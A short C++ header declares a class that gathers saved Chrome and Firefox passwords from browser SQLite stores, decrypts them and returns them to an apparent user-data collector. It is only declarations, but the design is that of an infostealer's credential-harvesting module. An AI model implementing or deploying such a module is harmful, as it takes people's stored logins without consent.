#ifndef SAVEDPASSWORDSDATASOURCE_H
#define SAVEDPASSWORDSDATASOURCE_H

#include "UserDataCollector.h"
#include <unordered_map>
#include <string>
#include <functional>

class SavedPasswordsDataSource : public DataSource {
public:
    std::unordered_map<std::string, std::string> collect(const std::string &userId) override;

private:
    std::unordered_map<std::string, std::string> collectChromePasswords();
    std::unordered_map<std::string, std::string> collectFirefoxPasswords();

    std::string decryptFirefoxPassword(const std::string &encryptedPassword);
    std::unordered_map<std::string, std::string> collectPasswordsFromSQLite(const std::string &dbPath, const std::string &query, const std::function<std::string(const void*, int)>& decryptFunc);
};

#endif // SAVEDPASSWORDSDATASOURCE_H


